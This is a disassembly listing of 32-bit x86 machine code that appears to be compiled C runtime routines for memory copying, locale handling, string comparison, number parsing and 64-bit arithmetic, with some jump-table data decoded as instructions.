  4283c1:	add    edi,eax
  4283c3:	jmp    DWORD PTR [edx*4+0x4283cc]
  4283ca:	mov    edi,edi
  4283cc:	fadd   QWORD PTR [ebx-0x7c1bffbe]
  4283d2:	inc    edx
  4283d3:	add    al,dh
  4283d5:	add    DWORD PTR [edx+0x0],0x4
  4283d9:	test   BYTE PTR [edx+0x0],al
  4283dc:	mov    eax,DWORD PTR [ebp+0x8]
  4283df:	pop    esi
  4283e0:	pop    edi
  4283e1:	leave  
  4283e2:	ret    
  4283e3:	nop
  4283e4:	mov    al,BYTE PTR [esi]
  4283e6:	mov    BYTE PTR [edi],al
  4283e8:	mov    eax,DWORD PTR [ebp+0x8]
  4283eb:	pop    esi
  4283ec:	pop    edi
  4283ed:	leave  
  4283ee:	ret    
  4283ef:	nop
  4283f0:	mov    al,BYTE PTR [esi]
  4283f2:	mov    BYTE PTR [edi],al
  4283f4:	mov    al,BYTE PTR [esi+0x1]
  4283f7:	mov    BYTE PTR [edi+0x1],al
  4283fa:	mov    eax,DWORD PTR [ebp+0x8]
  4283fd:	pop    esi
  4283fe:	pop    edi
  4283ff:	leave  
  428400:	ret    
  428401:	lea    ecx,[ecx+0x0]
  428404:	mov    al,BYTE PTR [esi]
  428406:	mov    BYTE PTR [edi],al
  428408:	mov    al,BYTE PTR [esi+0x1]
  42840b:	mov    BYTE PTR [edi+0x1],al
  42840e:	mov    al,BYTE PTR [esi+0x2]
  428411:	mov    BYTE PTR [edi+0x2],al
  428414:	mov    eax,DWORD PTR [ebp+0x8]
  428417:	pop    esi
  428418:	pop    edi
  428419:	leave  
  42841a:	ret    
  42841b:	nop
  42841c:	lea    esi,[ecx+esi*1-0x4]
  428420:	lea    edi,[ecx+edi*1-0x4]
  428424:	test   edi,0x3
  42842a:	jne    0x428450
  42842c:	shr    ecx,0x2
  42842f:	and    edx,0x3
  428432:	cmp    ecx,0x8
  428435:	jb     0x428444
  428437:	std    
  428438:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42843a:	cld    
  42843b:	jmp    DWORD PTR [edx*4+0x428568]
  428442:	mov    edi,edi
  428444:	neg    ecx
  428446:	jmp    DWORD PTR [ecx*4+0x428518]
  42844d:	lea    ecx,[ecx+0x0]
  428450:	mov    eax,edi
  428452:	mov    edx,0x3
  428457:	cmp    ecx,0x4
  42845a:	jb     0x428468
  42845c:	and    eax,0x3
  42845f:	sub    ecx,eax
  428461:	jmp    DWORD PTR [eax*4+0x42846c]
  428468:	jmp    DWORD PTR [ecx*4+0x428568]
  42846f:	nop
  428470:	jl     0x4283f6
  428472:	inc    edx
  428473:	add    BYTE PTR [eax-0x37ffbd7c],ah
  428479:	test   BYTE PTR [edx+0x0],al
  42847c:	mov    al,BYTE PTR [esi+0x3]
  42847f:	and    edx,ecx
  428481:	mov    BYTE PTR [edi+0x3],al
  428484:	sub    esi,0x1
  428487:	shr    ecx,0x2
  42848a:	sub    edi,0x1
  42848d:	cmp    ecx,0x8
  428490:	jb     0x428444
  428492:	std    
  428493:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428495:	cld    
  428496:	jmp    DWORD PTR [edx*4+0x428568]
  42849d:	lea    ecx,[ecx+0x0]
  4284a0:	mov    al,BYTE PTR [esi+0x3]
  4284a3:	and    edx,ecx
  4284a5:	mov    BYTE PTR [edi+0x3],al
  4284a8:	mov    al,BYTE PTR [esi+0x2]
  4284ab:	shr    ecx,0x2
  4284ae:	mov    BYTE PTR [edi+0x2],al
  4284b1:	sub    esi,0x2
  4284b4:	sub    edi,0x2
  4284b7:	cmp    ecx,0x8
  4284ba:	jb     0x428444
  4284bc:	std    
  4284bd:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4284bf:	cld    
  4284c0:	jmp    DWORD PTR [edx*4+0x428568]
  4284c7:	nop
  4284c8:	mov    al,BYTE PTR [esi+0x3]
  4284cb:	and    edx,ecx
  4284cd:	mov    BYTE PTR [edi+0x3],al
  4284d0:	mov    al,BYTE PTR [esi+0x2]
  4284d3:	mov    BYTE PTR [edi+0x2],al
  4284d6:	mov    al,BYTE PTR [esi+0x1]
  4284d9:	shr    ecx,0x2
  4284dc:	mov    BYTE PTR [edi+0x1],al
  4284df:	sub    esi,0x3
  4284e2:	sub    edi,0x3
  4284e5:	cmp    ecx,0x8
  4284e8:	jb     0x428444
  4284ee:	std    
  4284ef:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4284f1:	cld    
  4284f2:	jmp    DWORD PTR [edx*4+0x428568]
  4284f9:	lea    ecx,[ecx+0x0]
  4284fc:	sbb    al,0x85
  4284fe:	inc    edx
  4284ff:	add    BYTE PTR [eax*4-0x7ad3ffbe],ah
  428506:	inc    edx
  428507:	add    BYTE PTR [eax*4-0x7ac3ffbe],dh
  42850e:	inc    edx
  42850f:	add    BYTE PTR [ebp+eax*4+0x42],al
  428513:	add    BYTE PTR [ebp+eax*4+0x42],cl
  428517:	add    BYTE PTR [edi-0x7b],bl
  42851a:	inc    edx
  42851b:	add    BYTE PTR [ebx-0x76e371bc],cl
  428521:	inc    esp
  428522:	(bad)  
  428523:	sbb    al,0x8b
  428525:	inc    esp
  428526:	mov    ds,WORD PTR [eax]
  428528:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42852c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  428530:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  428534:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  428538:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  42853c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  428540:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  428544:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  428548:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  42854c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  428550:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  428554:	lea    eax,[ecx*4+0x0]
  42855b:	add    esi,eax
  42855d:	add    edi,eax
  42855f:	jmp    DWORD PTR [edx*4+0x428568]
  428566:	mov    edi,edi
  428568:	js     0x4284ef
  42856a:	inc    edx
  42856b:	add    BYTE PTR [eax-0x6fffbd7b],al
  428571:	test   DWORD PTR [edx+0x0],eax
  428574:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428575:	test   DWORD PTR [edx+0x0],eax
  428578:	mov    eax,DWORD PTR [ebp+0x8]
  42857b:	pop    esi
  42857c:	pop    edi
  42857d:	leave  
  42857e:	ret    
  42857f:	nop
  428580:	mov    al,BYTE PTR [esi+0x3]
  428583:	mov    BYTE PTR [edi+0x3],al
  428586:	mov    eax,DWORD PTR [ebp+0x8]
  428589:	pop    esi
  42858a:	pop    edi
  42858b:	leave  
  42858c:	ret    
  42858d:	lea    ecx,[ecx+0x0]
  428590:	mov    al,BYTE PTR [esi+0x3]
  428593:	mov    BYTE PTR [edi+0x3],al
  428596:	mov    al,BYTE PTR [esi+0x2]
  428599:	mov    BYTE PTR [edi+0x2],al
  42859c:	mov    eax,DWORD PTR [ebp+0x8]
  42859f:	pop    esi
  4285a0:	pop    edi
  4285a1:	leave  
  4285a2:	ret    
  4285a3:	nop
  4285a4:	mov    al,BYTE PTR [esi+0x3]
  4285a7:	mov    BYTE PTR [edi+0x3],al
  4285aa:	mov    al,BYTE PTR [esi+0x2]
  4285ad:	mov    BYTE PTR [edi+0x2],al
  4285b0:	mov    al,BYTE PTR [esi+0x1]
  4285b3:	mov    BYTE PTR [edi+0x1],al
  4285b6:	mov    eax,DWORD PTR [ebp+0x8]
  4285b9:	pop    esi
  4285ba:	pop    edi
  4285bb:	leave  
  4285bc:	ret    
  4285bd:	push   ebp
  4285be:	mov    ebp,esp
  4285c0:	sub    esp,0xc
  4285c3:	mov    eax,ds:0x45d430
  4285c8:	xor    eax,DWORD PTR [ebp+0x4]
  4285cb:	and    BYTE PTR [ebp-0x6],0x0
  4285cf:	push   0x6
  4285d1:	mov    DWORD PTR [ebp-0x4],eax
  4285d4:	lea    eax,[ebp-0xc]
  4285d7:	push   eax
  4285d8:	push   0x1004
  4285dd:	push   DWORD PTR [ebp+0x8]
  4285e0:	call   DWORD PTR ds:0x4290fc
  4285e6:	test   eax,eax
  4285e8:	jne    0x4285ef
  4285ea:	or     eax,0xffffffff
  4285ed:	jmp    0x4285f9
  4285ef:	lea    eax,[ebp-0xc]
  4285f2:	push   eax
  4285f3:	call   0x4288fe
  4285f8:	pop    ecx
  4285f9:	mov    ecx,DWORD PTR [ebp-0x4]
  4285fc:	xor    ecx,DWORD PTR [ebp+0x4]
  4285ff:	call   0x425a0c
  428604:	leave  
  428605:	ret    
  428606:	push   0x38
  428608:	push   0x429fb8
  42860d:	call   0x425340
  428612:	mov    eax,ds:0x45d430
  428617:	xor    eax,DWORD PTR [ebp+0x4]
  42861a:	mov    DWORD PTR [ebp-0x1c],eax
  42861d:	xor    edi,edi
  42861f:	mov    DWORD PTR [ebp-0x20],edi
  428622:	mov    DWORD PTR [ebp-0x24],edi
  428625:	mov    eax,DWORD PTR [ebp+0x14]
  428628:	mov    ebx,DWORD PTR [eax]
  42862a:	mov    DWORD PTR [ebp-0x28],ebx
  42862d:	mov    DWORD PTR [ebp-0x2c],edi
  428630:	mov    eax,DWORD PTR [ebp+0x8]
  428633:	cmp    eax,DWORD PTR [ebp+0xc]
  428636:	je     0x4287af
  42863c:	lea    ecx,[ebp-0x40]
  42863f:	push   ecx
  428640:	push   eax
  428641:	mov    esi,DWORD PTR ds:0x4290c4
  428647:	call   esi
  428649:	test   eax,eax
  42864b:	je     0x42866d
  42864d:	cmp    DWORD PTR [ebp-0x40],0x1
  428651:	jne    0x42866d
  428653:	lea    eax,[ebp-0x40]
  428656:	push   eax
  428657:	push   DWORD PTR [ebp+0xc]
  42865a:	call   esi
  42865c:	test   eax,eax
  42865e:	je     0x42866d
  428660:	cmp    DWORD PTR [ebp-0x40],0x1
  428664:	jne    0x42866d
  428666:	mov    DWORD PTR [ebp-0x2c],0x1
  42866d:	cmp    DWORD PTR [ebp-0x2c],edi
  428670:	je     0x42868c
  428672:	cmp    ebx,0xffffffff
  428675:	je     0x42867b
  428677:	mov    esi,ebx
  428679:	jmp    0x428687
  42867b:	push   DWORD PTR [ebp+0x10]
  42867e:	call   0x425950
  428683:	pop    ecx
  428684:	mov    esi,eax
  428686:	inc    esi
  428687:	mov    DWORD PTR [ebp-0x44],esi
  42868a:	jmp    0x42868f
  42868c:	mov    esi,DWORD PTR [ebp-0x44]
  42868f:	cmp    DWORD PTR [ebp-0x2c],edi
  428692:	jne    0x4286ae
  428694:	push   edi
  428695:	push   edi
  428696:	push   ebx
  428697:	push   DWORD PTR [ebp+0x10]
  42869a:	push   0x1
  42869c:	push   DWORD PTR [ebp+0x8]
  42869f:	call   DWORD PTR ds:0x4290ec
  4286a5:	mov    esi,eax
  4286a7:	mov    DWORD PTR [ebp-0x44],esi
  4286aa:	cmp    esi,edi
  4286ac:	je     0x428706
  4286ae:	mov    DWORD PTR [ebp-0x4],edi
  4286b1:	lea    eax,[esi+esi*1]
  4286b4:	add    eax,0x3
  4286b7:	and    eax,0xfffffffc
  4286ba:	call   0x425390
  4286bf:	mov    DWORD PTR [ebp-0x18],esp
  4286c2:	mov    ebx,esp
  4286c4:	mov    DWORD PTR [ebp-0x48],ebx
  4286c7:	lea    eax,[esi+esi*1]
  4286ca:	push   eax
  4286cb:	push   edi
  4286cc:	push   ebx
  4286cd:	call   0x427c40
  4286d2:	add    esp,0xc
  4286d5:	or     DWORD PTR [ebp-0x4],0xffffffff
  4286d9:	jmp    0x4286f2
  4286db:	xor    eax,eax
  4286dd:	inc    eax
  4286de:	ret    
  4286df:	mov    esp,DWORD PTR [ebp-0x18]
  4286e2:	call   0x4287d5
  4286e7:	xor    edi,edi
  4286e9:	xor    ebx,ebx
  4286eb:	or     DWORD PTR [ebp-0x4],0xffffffff
  4286ef:	mov    esi,DWORD PTR [ebp-0x44]
  4286f2:	cmp    ebx,edi
  4286f4:	jne    0x428714
  4286f6:	push   esi
  4286f7:	push   0x2
  4286f9:	call   0x426458
  4286fe:	pop    ecx
  4286ff:	pop    ecx
  428700:	mov    ebx,eax
  428702:	cmp    ebx,edi
  428704:	jne    0x42870d
  428706:	xor    eax,eax
  428708:	jmp    0x4287c1
  42870d:	mov    DWORD PTR [ebp-0x24],0x1
  428714:	push   esi
  428715:	push   ebx
  428716:	push   DWORD PTR [ebp-0x28]
  428719:	push   DWORD PTR [ebp+0x10]
  42871c:	push   0x1
  42871e:	push   DWORD PTR [ebp+0x8]
  428721:	call   DWORD PTR ds:0x4290ec
  428727:	test   eax,eax
  428729:	je     0x4287b2
  42872f:	cmp    DWORD PTR [ebp+0x18],edi
  428732:	je     0x428754
  428734:	push   edi
  428735:	push   edi
  428736:	push   DWORD PTR [ebp+0x1c]
  428739:	push   DWORD PTR [ebp+0x18]
  42873c:	push   esi
  42873d:	push   ebx
  42873e:	push   edi
  42873f:	push   DWORD PTR [ebp+0xc]
  428742:	call   DWORD PTR ds:0x42907c
  428748:	test   eax,eax
  42874a:	je     0x4287b2
  42874c:	mov    eax,DWORD PTR [ebp+0x18]
  42874f:	mov    DWORD PTR [ebp-0x20],eax
  428752:	jmp    0x4287b2
  428754:	cmp    DWORD PTR [ebp-0x2c],edi
  428757:	jne    0x42876f
  428759:	push   edi
  42875a:	push   edi
  42875b:	push   edi
  42875c:	push   edi
  42875d:	push   esi
  42875e:	push   ebx
  42875f:	push   edi
  428760:	push   DWORD PTR [ebp+0xc]
  428763:	call   DWORD PTR ds:0x42907c
  428769:	mov    esi,eax
  42876b:	cmp    esi,edi
  42876d:	je     0x4287b2
  42876f:	push   esi
  428770:	push   0x1
  428772:	call   0x426458
  428777:	pop    ecx
  428778:	pop    ecx
  428779:	mov    DWORD PTR [ebp-0x20],eax
  42877c:	cmp    eax,edi
  42877e:	je     0x4287b2
  428780:	push   edi
  428781:	push   edi
  428782:	push   esi
  428783:	push   eax
  428784:	push   esi
  428785:	push   ebx
  428786:	push   edi
  428787:	push   DWORD PTR [ebp+0xc]
  42878a:	call   DWORD PTR ds:0x42907c
  428790:	cmp    eax,edi
  428792:	jne    0x4287a2
  428794:	push   DWORD PTR [ebp-0x20]
  428797:	call   0x425f4a
  42879c:	pop    ecx
  42879d:	mov    DWORD PTR [ebp-0x20],edi
  4287a0:	jmp    0x4287b2
  4287a2:	cmp    DWORD PTR [ebp-0x28],0xffffffff
  4287a6:	je     0x4287b2
  4287a8:	mov    ecx,DWORD PTR [ebp+0x14]
  4287ab:	mov    DWORD PTR [ecx],eax
  4287ad:	jmp    0x4287b2
  4287af:	mov    ebx,DWORD PTR [ebp-0x48]
  4287b2:	cmp    DWORD PTR [ebp-0x24],edi
  4287b5:	je     0x4287be
  4287b7:	push   ebx
  4287b8:	call   0x425f4a
  4287bd:	pop    ecx
  4287be:	mov    eax,DWORD PTR [ebp-0x20]
  4287c1:	lea    esp,[ebp-0x54]
  4287c4:	mov    ecx,DWORD PTR [ebp-0x1c]
  4287c7:	xor    ecx,DWORD PTR [ebp+0x4]
  4287ca:	call   0x425a0c
  4287cf:	call   0x42537b
  4287d4:	ret    
  4287d5:	push   ebp
  4287d6:	mov    ebp,esp
  4287d8:	sub    esp,0x48
  4287db:	push   ebx
  4287dc:	push   esi
  4287dd:	push   edi
  4287de:	push   0x4
  4287e0:	pop    eax
  4287e1:	call   0x425390
  4287e6:	mov    ebx,esp
  4287e8:	push   0x1c
  4287ea:	lea    eax,[ebp-0x24]
  4287ed:	push   eax
  4287ee:	push   ebx
  4287ef:	call   DWORD PTR ds:0x429108
  4287f5:	test   eax,eax
  4287f7:	je     0x42886a
  4287f9:	mov    edi,DWORD PTR [ebp-0x20]
  4287fc:	lea    eax,[ebp-0x48]
  4287ff:	push   eax
  428800:	call   DWORD PTR ds:0x429048
  428806:	mov    eax,DWORD PTR [ebp-0x44]
  428809:	lea    esi,[eax-0x1]
  42880c:	not    esi
  42880e:	and    esi,ebx
  428810:	sub    esi,eax
  428812:	mov    DWORD PTR [ebp-0x4],eax
  428815:	mov    eax,ds:0x45dac4
  42881a:	mov    ecx,eax
  42881c:	dec    ecx
  42881d:	neg    ecx
  42881f:	sbb    ecx,ecx
  428821:	and    ecx,0xffff1000
  428827:	add    ecx,0x11000
  42882d:	add    ecx,edi
  42882f:	cmp    esi,ecx
  428831:	jb     0x42886a
  428833:	cmp    eax,0x1
  428836:	je     0x428882
  428838:	mov    ebx,edi
  42883a:	mov    edi,0x1000
  42883f:	push   0x1c
  428841:	lea    eax,[ebp-0x24]
  428844:	push   eax
  428845:	push   ebx
  428846:	call   DWORD PTR ds:0x429108
  42884c:	test   eax,eax
  42884e:	je     0x42886a
  428850:	add    ebx,DWORD PTR [ebp-0x18]
  428853:	test   DWORD PTR [ebp-0x14],edi
  428856:	je     0x42883f
  428858:	test   BYTE PTR [ebp-0xf],0x1
  42885c:	mov    ebx,DWORD PTR [ebp-0x24]
  42885f:	je     0x428866
  428861:	xor    eax,eax
  428863:	inc    eax
  428864:	jmp    0x42889e
  428866:	cmp    esi,ebx
  428868:	jae    0x42886e
  42886a:	xor    eax,eax
  42886c:	jmp    0x42889e
  42886e:	push   0x4
  428870:	push   edi
  428871:	push   DWORD PTR [ebp-0x4]
  428874:	push   ebx
  428875:	call   DWORD PTR ds:0x4290cc
  42887b:	mov    eax,ds:0x45dac4
  428880:	jmp    0x428884
  428882:	mov    ebx,esi
  428884:	dec    eax
  428885:	neg    eax
  428887:	sbb    eax,eax
  428889:	and    eax,0x103
  42888e:	lea    ecx,[ebp-0x8]
  428891:	push   ecx
  428892:	inc    eax
  428893:	push   eax
  428894:	push   DWORD PTR [ebp-0x4]
  428897:	push   ebx
  428898:	call   DWORD PTR ds:0x429104
  42889e:	lea    esp,[ebp-0x54]
  4288a1:	pop    edi
  4288a2:	pop    esi
  4288a3:	pop    ebx
  4288a4:	leave  
  4288a5:	ret    
  4288a6:	int3   
  4288a7:	int3   
  4288a8:	int3   
  4288a9:	int3   
  4288aa:	int3   
  4288ab:	int3   
  4288ac:	int3   
  4288ad:	int3   
  4288ae:	int3   
  4288af:	int3   
  4288b0:	push   ebp
  4288b1:	mov    ebp,esp
  4288b3:	push   edi
  4288b4:	push   esi
  4288b5:	push   ebx
  4288b6:	mov    esi,DWORD PTR [ebp+0xc]
  4288b9:	mov    edi,DWORD PTR [ebp+0x8]
  4288bc:	mov    al,0xff
  4288be:	mov    edi,edi
  4288c0:	or     al,al
  4288c2:	je     0x4288f6
  4288c4:	mov    al,BYTE PTR [esi]
  4288c6:	add    esi,0x1
  4288c9:	mov    ah,BYTE PTR [edi]
  4288cb:	add    edi,0x1
  4288ce:	cmp    ah,al
  4288d0:	je     0x4288c0
  4288d2:	sub    al,0x41
  4288d4:	cmp    al,0x1a
  4288d6:	sbb    cl,cl
  4288d8:	and    cl,0x20
  4288db:	add    al,cl
  4288dd:	add    al,0x41
  4288df:	xchg   al,ah
  4288e1:	sub    al,0x41
  4288e3:	cmp    al,0x1a
  4288e5:	sbb    cl,cl
  4288e7:	and    cl,0x20
  4288ea:	add    al,cl
  4288ec:	add    al,0x41
  4288ee:	cmp    al,ah
  4288f0:	je     0x4288c0
  4288f2:	sbb    al,al
  4288f4:	sbb    al,0xff
  4288f6:	movsx  eax,al
  4288f9:	pop    ebx
  4288fa:	pop    esi
  4288fb:	pop    edi
  4288fc:	leave  
  4288fd:	ret    
  4288fe:	push   esi
  4288ff:	push   edi
  428900:	call   0x4251f3
  428905:	mov    edi,DWORD PTR [eax+0x64]
  428908:	cmp    edi,DWORD PTR ds:0x45d58c
  42890e:	je     0x428917
  428910:	call   0x42669f
  428915:	mov    edi,eax
  428917:	mov    esi,DWORD PTR [esp+0xc]
  42891b:	cmp    DWORD PTR [edi+0x28],0x1
  42891f:	movzx  eax,BYTE PTR [esi]
  428922:	jle    0x428932
  428924:	push   0x8
  428926:	push   eax
  428927:	push   edi
  428928:	call   0x428986
  42892d:	add    esp,0xc
  428930:	jmp    0x42893c
  428932:	mov    ecx,DWORD PTR [edi+0x48]
  428935:	movzx  eax,BYTE PTR [ecx+eax*2]
  428939:	and    eax,0x8
  42893c:	test   eax,eax
  42893e:	je     0x428943
  428940:	inc    esi
  428941:	jmp    0x42891b
  428943:	movzx  ecx,BYTE PTR [esi]
  428946:	inc    esi
  428947:	cmp    ecx,0x2d
  42894a:	mov    edx,ecx
  42894c:	je     0x428953
  42894e:	cmp    ecx,0x2b
  428951:	jne    0x428957
  428953:	movzx  ecx,BYTE PTR [esi]
  428956:	inc    esi
  428957:	xor    eax,eax
  428959:	cmp    ecx,0x30
  42895c:	jl     0x428968
  42895e:	cmp    ecx,0x39
  428961:	jg     0x428968
  428963:	sub    ecx,0x30
  428966:	jmp    0x42896b
  428968:	or     ecx,0xffffffff
  42896b:	cmp    ecx,0xffffffff
  42896e:	je     0x42897c
  428970:	lea    eax,[eax+eax*4]
  428973:	lea    eax,[ecx+eax*2]
  428976:	movzx  ecx,BYTE PTR [esi]
  428979:	inc    esi
  42897a:	jmp    0x428959
  42897c:	cmp    edx,0x2d
  42897f:	pop    edi
  428980:	pop    esi
  428981:	jne    0x428985
  428983:	neg    eax
  428985:	ret    
  428986:	push   ebp
  428987:	mov    ebp,esp
  428989:	push   ecx
  42898a:	mov    eax,DWORD PTR [ebp+0xc]
  42898d:	lea    ecx,[eax+0x1]
  428990:	cmp    ecx,0x100
  428996:	mov    ecx,DWORD PTR [ebp+0x8]
  428999:	ja     0x4289a4
  42899b:	mov    ecx,DWORD PTR [ecx+0x48]
  42899e:	movzx  eax,WORD PTR [ecx+eax*2]
  4289a2:	jmp    0x4289f8
  4289a4:	push   esi
  4289a5:	mov    edx,eax
  4289a7:	sar    edx,0x8
  4289aa:	push   edi
  4289ab:	mov    edi,DWORD PTR [ecx+0x48]
  4289ae:	movzx  esi,dl
  4289b1:	test   BYTE PTR [edi+esi*2+0x1],0x80
  4289b6:	pop    edi
  4289b7:	pop    esi
  4289b8:	je     0x4289c9
  4289ba:	and    BYTE PTR [ebp-0x2],0x0
  4289be:	push   0x2
  4289c0:	mov    BYTE PTR [ebp-0x3],al
  4289c3:	mov    BYTE PTR [ebp-0x4],dl
  4289c6:	pop    eax
  4289c7:	jmp    0x4289d3
  4289c9:	and    BYTE PTR [ebp-0x3],0x0
  4289cd:	mov    BYTE PTR [ebp-0x4],al
  4289d0:	xor    eax,eax
  4289d2:	inc    eax
  4289d3:	push   0x1
  4289d5:	push   DWORD PTR [ecx+0x14]
  4289d8:	push   DWORD PTR [ecx+0x4]
  4289db:	lea    ecx,[ebp+0xe]
  4289de:	push   ecx
  4289df:	push   eax
  4289e0:	lea    eax,[ebp-0x4]
  4289e3:	push   eax
  4289e4:	push   0x1
  4289e6:	call   0x427a68
  4289eb:	add    esp,0x1c
  4289ee:	test   eax,eax
  4289f0:	jne    0x4289f4
  4289f2:	leave  
  4289f3:	ret    
  4289f4:	movzx  eax,WORD PTR [ebp+0xe]
  4289f8:	and    eax,DWORD PTR [ebp+0x10]
  4289fb:	leave  
  4289fc:	ret    
  4289fd:	int3   
  4289fe:	int3   
  4289ff:	int3   
  428a00:	mov    eax,DWORD PTR [esp+0x8]
  428a04:	mov    ecx,DWORD PTR [esp+0x10]
  428a08:	or     ecx,eax
  428a0a:	mov    ecx,DWORD PTR [esp+0xc]
  428a0e:	jne    0x428a19
  428a10:	mov    eax,DWORD PTR [esp+0x4]
  428a14:	mul    ecx
  428a16:	ret    0x10
  428a19:	push   ebx
  428a1a:	mul    ecx
  428a1c:	mov    ebx,eax
  428a1e:	mov    eax,DWORD PTR [esp+0x8]
  428a22:	mul    DWORD PTR [esp+0x14]
  428a26:	add    ebx,eax
  428a28:	mov    eax,DWORD PTR [esp+0x8]
  428a2c:	mul    ecx
  428a2e:	add    edx,ebx
  428a30:	pop    ebx
  428a31:	ret    0x10
  428a34:	int3   
  428a35:	int3   
  428a36:	int3   
  428a37:	int3   
  428a38:	int3   
  428a39:	int3   
  428a3a:	int3   
  428a3b:	int3   
  428a3c:	int3   
  428a3d:	int3   
  428a3e:	int3   
  428a3f:	int3   
  428a40:	push   ebp
  428a41:	mov    ebp,esp
  428a43:	push   edi
  428a44:	push   esi
  428a45:	push   ebx
  428a46:	mov    ecx,DWORD PTR [ebp+0x10]
  428a49:	or     ecx,ecx
  428a4b:	je     0x428a9a
  428a4d:	mov    esi,DWORD PTR [ebp+0x8]
  428a50:	mov    edi,DWORD PTR [ebp+0xc]
  428a53:	mov    bh,0x41
  428a55:	mov    bl,0x5a
  428a57:	mov    dh,0x20
  428a59:	lea    ecx,[ecx+0x0]
  428a5c:	mov    ah,BYTE PTR [esi]
  428a5e:	or     ah,ah
  428a60:	mov    al,BYTE PTR [edi]
  428a62:	je     0x428a8b
  428a64:	or     al,al
  428a66:	je     0x428a8b
  428a68:	add    esi,0x1
  428a6b:	add    edi,0x1
  428a6e:	cmp    ah,bh
  428a70:	jb     0x428a78
  428a72:	cmp    ah,bl
  428a74:	ja     0x428a78
  428a76:	add    ah,dh
  428a78:	cmp    al,bh
  428a7a:	jb     0x428a82
  428a7c:	cmp    al,bl
  428a7e:	ja     0x428a82
  428a80:	add    al,dh
  428a82:	cmp    ah,al
  428a84:	jne    0x428a91
  428a86:	sub    ecx,0x1
  428a89:	jne    0x428a5c
  428a8b:	xor    ecx,ecx
  428a8d:	cmp    ah,al
  428a8f:	je     0x428a9a
  428a91:	mov    ecx,0xffffffff
  428a96:	jb     0x428a9a
  428a98:	neg    ecx
  428a9a:	mov    eax,ecx
  428a9c:	pop    ebx
  428a9d:	pop    esi
  428a9e:	pop    edi
  428a9f:	leave  
  428aa0:	ret    
  428aa1:	int3   
  428aa2:	int3   
  428aa3:	int3   
  428aa4:	int3   
  428aa5:	int3   
  428aa6:	int3   
  428aa7:	int3   
  428aa8:	int3   
  428aa9:	int3   
  428aaa:	int3   
  428aab:	int3   
  428aac:	int3   
  428aad:	int3   
  428aae:	int3   
  428aaf:	int3   
  428ab0:	push   esi
  428ab1:	mov    eax,DWORD PTR [esp+0x14]
  428ab5:	or     eax,eax
  428ab7:	jne    0x428ae1
  428ab9:	mov    ecx,DWORD PTR [esp+0x10]
  428abd:	mov    eax,DWORD PTR [esp+0xc]
  428ac1:	xor    edx,edx
  428ac3:	div    ecx
  428ac5:	mov    ebx,eax
  428ac7:	mov    eax,DWORD PTR [esp+0x8]
  428acb:	div    ecx
  428acd:	mov    esi,eax
  428acf:	mov    eax,ebx
  428ad1:	mul    DWORD PTR [esp+0x10]
  428ad5:	mov    ecx,eax
  428ad7:	mov    eax,esi
  428ad9:	mul    DWORD PTR [esp+0x10]
  428add:	add    edx,ecx
  428adf:	jmp    0x428b28
  428ae1:	mov    ecx,eax
  428ae3:	mov    ebx,DWORD PTR [esp+0x10]
  428ae7:	mov    edx,DWORD PTR [esp+0xc]
  428aeb:	mov    eax,DWORD PTR [esp+0x8]
  428aef:	shr    ecx,1
  428af1:	rcr    ebx,1
  428af3:	shr    edx,1
  428af5:	rcr    eax,1
  428af7:	or     ecx,ecx
  428af9:	jne    0x428aef
  428afb:	div    ebx
  428afd:	mov    esi,eax
  428aff:	mul    DWORD PTR [esp+0x14]
  428b03:	mov    ecx,eax
  428b05:	mov    eax,DWORD PTR [esp+0x10]
  428b09:	mul    esi
  428b0b:	add    edx,ecx
  428b0d:	jb     0x428b1d
  428b0f:	cmp    edx,DWORD PTR [esp+0xc]
  428b13:	ja     0x428b1d
  428b15:	jb     0x428b26
  428b17:	cmp    eax,DWORD PTR [esp+0x8]
  428b1b:	jbe    0x428b26
  428b1d:	dec    esi
  428b1e:	sub    eax,DWORD PTR [esp+0x10]
  428b22:	sbb    edx,DWORD PTR [esp+0x14]
  428b26:	xor    ebx,ebx
  428b28:	sub    eax,DWORD PTR [esp+0x8]
  428b2c:	sbb    edx,DWORD PTR [esp+0xc]
  428b30:	neg    edx
  428b32:	neg    eax
  428b34:	sbb    edx,0x0
  428b37:	mov    ecx,edx
  428b39:	mov    edx,ebx
  428b3b:	mov    ebx,ecx
  428b3d:	mov    ecx,eax
  428b3f:	mov    eax,esi
  428b41:	pop    esi
  428b42:	ret    0x10
  428b45:	int3   
  428b46:	int3   
  428b47:	int3   
  428b48:	int3   
  428b49:	int3   
  428b4a:	int3   
  428b4b:	int3   
  428b4c:	int3   
  428b4d:	int3   
  428b4e:	int3   
  428b4f:	int3   
  428b50:	lea    eax,[edx-0x1]
  428b53:	pop    ebx
  428b54:	ret    
  428b55:	lea    esp,[esp+0x0]
  428b5c:	lea    esp,[esp+0x0]
  428b60:	xor    eax,eax
  428b62:	mov    al,BYTE PTR [esp+0x8]
  428b66:	push   ebx
  428b67:	mov    ebx,eax
  428b69:	shl    eax,0x8
  428b6c:	mov    edx,DWORD PTR [esp+0x8]
  428b70:	test   edx,0x3
  428b76:	je     0x428b8d
  428b78:	mov    cl,BYTE PTR [edx]
  428b7a:	add    edx,0x1
  428b7d:	cmp    cl,bl
  428b7f:	je     0x428b50
  428b81:	test   cl,cl
  428b83:	je     0x428bd6
  428b85:	test   edx,0x3
  428b8b:	jne    0x428b78
  428b8d:	or     ebx,eax
  428b8f:	push   edi
  428b90:	mov    eax,ebx
  428b92:	shl    ebx,0x10
  428b95:	push   esi
  428b96:	or     ebx,eax
  428b98:	mov    ecx,DWORD PTR [edx]
  428b9a:	mov    edi,0x7efefeff
  428b9f:	mov    eax,ecx
  428ba1:	mov    esi,edi
  428ba3:	xor    ecx,ebx
  428ba5:	add    esi,eax
  428ba7:	add    edi,ecx
  428ba9:	xor    ecx,0xffffffff
